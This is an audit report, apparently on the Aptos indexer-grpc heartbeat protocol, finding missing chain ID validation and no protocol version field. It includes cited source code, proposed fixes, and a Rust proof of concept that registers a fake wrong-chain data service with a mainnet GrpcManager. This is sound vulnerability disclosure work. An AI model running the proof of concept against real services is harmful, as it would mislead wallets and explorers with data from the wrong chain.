# Audit Report

## Title
Missing Chain ID Validation and Protocol Version Negotiation in Indexer-gRPC Heartbeat Protocol

## Summary
The HeartbeatRequest/Response protocol between indexer-grpc data services and GrpcManager lacks both protocol version negotiation and chain ID validation, allowing cross-chain data pollution and potential service incompatibility.

## Finding Description

The heartbeat mechanism in the indexer-grpc system has two critical missing validations:

**1. No Chain ID Validation**

When a data service sends a heartbeat to the GrpcManager, the GrpcManager accepts the service information without validating that the `chain_id` matches its own configured chain. [1](#0-0) [2](#0-1) [3](#0-2) 

The `handle_live_data_service_info` and `handle_historical_data_service_info` functions accept and store service information without checking if `info.chain_id` matches `self.chain_id`. This allows a data service configured for Testnet (chain_id=4) to register with a Mainnet GrpcManager (chain_id=1).

**2. No Protocol Version Field** [4](#0-3) 

The HeartbeatRequest and HeartbeatResponse messages contain no protocol version field. While Protocol Buffers v3 provides forward/backward compatibility by ignoring unknown fields, this creates semantic incompatibility risks when new required fields are added (like `min_servable_version` in LiveDataServiceInfo).

**Attack Scenario:**

1. Attacker runs a malicious data service configured with `chain_id = 4` (Testnet)
2. Attacker configures it to send heartbeats to a Mainnet GrpcManager (`chain_id = 1`)
3. GrpcManager accepts the heartbeat without validation
4. GrpcManager registers the Testnet service in its service discovery registry
5. Clients requesting Mainnet data may be routed to the Testnet service
6. Clients receive Testnet transaction data when expecting Mainnet data [5](#0-4) [6](#0-5) 

Additionally, the `known_latest_version` can be corrupted by cross-chain services: [7](#0-6) 

## Impact Explanation

This qualifies as **High Severity** under "Significant protocol violations" and potentially "API crashes":

1. **Data Integrity Violation**: Clients querying the indexer API can receive transaction data from the wrong blockchain, leading to incorrect application state
2. **Service Discovery Pollution**: The GrpcManager's service registry becomes polluted with wrong-chain services
3. **Version Skew Issues**: Without version negotiation, protocol evolution can silently break compatibility between services running different code versions

While this is off-chain infrastructure and doesn't directly affect consensus or on-chain funds, the indexer-grpc API is critical infrastructure that wallets, explorers, and dApps depend on for accurate historical data.

## Likelihood Explanation

**High likelihood** - This can occur through:
- Misconfiguration: Operators accidentally configure wrong chain_id
- Malicious attack: Attacker deliberately registers wrong-chain services
- No authentication on the heartbeat endpoint makes this trivial to exploit

The GrpcManager service is publicly accessible (depending on network configuration) with no authentication: [8](#0-7) 

## Recommendation

**Fix 1: Add Chain ID Validation**

```rust
fn handle_live_data_service_info(
    &self,
    address: GrpcAddress,
    mut info: LiveDataServiceInfo,
) -> Result<()> {
    // Add chain_id validation
    if info.chain_id != self.chain_id {
        bail!("Chain ID mismatch: expected {}, got {}", self.chain_id, info.chain_id);
    }
    
    let mut entry = self
        .live_data_services
        .entry(address.clone())
        .or_insert(LiveDataService::new(address));
    // ... rest of the function
}
```

Apply the same validation to `handle_historical_data_service_info`, `handle_fullnode_info`, and `handle_grpc_manager_info`.

**Fix 2: Add Protocol Version Field**

```protobuf
message HeartbeatRequest {
  optional ServiceInfo service_info = 1;
  optional uint32 protocol_version = 2;  // Add version field
}

message HeartbeatResponse {
  optional uint64 known_latest_version = 1;
  optional uint32 protocol_version = 2;  // Add version field
}
```

Implement version negotiation logic to reject incompatible versions.

## Proof of Concept

```rust
// Proof of Concept: Cross-chain data pollution attack
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient, 
    LiveDataServiceInfo, ServiceInfo, HeartbeatRequest,
    service_info::Info,
};
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Attacker creates a data service with WRONG chain_id
    let malicious_chain_id = 4; // Testnet
    let target_grpc_manager = "http://mainnet-grpc-manager:50051"; // Mainnet
    
    // Connect to Mainnet GrpcManager
    let channel = Channel::from_shared(target_grpc_manager.to_string())?
        .connect()
        .await?;
    let mut client = GrpcManagerClient::new(channel);
    
    // Create heartbeat with WRONG chain_id
    let service_info = ServiceInfo {
        address: Some("http://malicious-service:50052".to_string()),
        info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
            chain_id: malicious_chain_id, // WRONG chain!
            timestamp: Some(aptos_indexer_grpc_utils::timestamp_now_proto()),
            known_latest_version: Some(1000000),
            stream_info: None,
            min_servable_version: Some(0),
        })),
    };
    
    let request = HeartbeatRequest {
        service_info: Some(service_info),
    };
    
    // GrpcManager ACCEPTS without validation!
    let response = client.heartbeat(request).await?;
    println!("Malicious service registered successfully!");
    println!("Response: {:?}", response);
    
    // Now Mainnet clients can be routed to Testnet service
    Ok(())
}
```

## Notes

While this vulnerability affects off-chain indexer infrastructure rather than core consensus, it represents a **significant protocol violation** that can lead to data corruption for API consumers. The lack of basic security controls (chain ID validation, protocol versioning) in a public-facing service discovery system is a legitimate security concern that should be addressed.

### Citations

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L35-49)
```text
message LiveDataServiceInfo {
  uint64 chain_id = 1;
  optional aptos.util.timestamp.Timestamp timestamp = 2;
  optional uint64 known_latest_version = 3;
  optional StreamInfo stream_info = 4;
  // If not present, it means the data service is not available to serve anything yet.
  optional uint64 min_servable_version = 5;
}

message HistoricalDataServiceInfo {
  uint64 chain_id = 1;
  optional aptos.util.timestamp.Timestamp timestamp = 2;
  optional uint64 known_latest_version = 3;
  optional StreamInfo stream_info = 4;
}
```

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L74-80)
```text
message HeartbeatRequest {
  optional ServiceInfo service_info = 1;
}

message HeartbeatResponse {
  optional uint64 known_latest_version = 1;
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L511-531)
```rust
    fn handle_historical_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: HistoricalDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .historical_data_services
            .entry(address.clone())
            .or_insert(HistoricalDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L533-550)
```rust
    fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
        let mut entry = self
            .fullnodes
            .entry(address.clone())
            .or_insert(Fullnode::new(address.clone()));
        entry.value_mut().recent_states.push_back(info);
        if let Some(known_latest_version) = info.known_latest_version {
            trace!(
                "Received known_latest_version ({known_latest_version}) from fullnode {address}."
            );
            self.update_known_latest_version(known_latest_version);
        }
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L35-45)
```rust
    async fn handle_heartbeat(
        &self,
        address: String,
        info: Info,
    ) -> anyhow::Result<Response<HeartbeatResponse>> {
        self.metadata_manager.handle_heartbeat(address, info)?;

        Ok(Response::new(HeartbeatResponse {
            known_latest_version: Some(self.metadata_manager.get_known_latest_version()),
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L91-129)
```rust
    pub(crate) fn start(&self, service_config: &ServiceConfig) -> Result<()> {
        let service = GrpcManagerServer::new(GrpcManagerService::new(
            self.chain_id,
            self.metadata_manager.clone(),
            self.data_manager.clone(),
        ))
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd)
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
        let server = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
            .add_service(service);

        let (tx, rx) = channel();
        tokio_scoped::scope(|s| {
            s.spawn(async move {
                self.metadata_manager.start().await.unwrap();
            });
            s.spawn(async move { self.data_manager.start(self.is_master, rx).await });
            if self.is_master {
                s.spawn(async move {
                    self.file_store_uploader
                        .lock()
                        .await
                        .start(self.data_manager.clone(), tx)
                        .await
                        .unwrap();
                });
            }
            s.spawn(async move {
                info!("Starting GrpcManager at {}.", service_config.listen_address);
                server.serve(service_config.listen_address).await.unwrap();
            });
        });

        Ok(())
    }
```
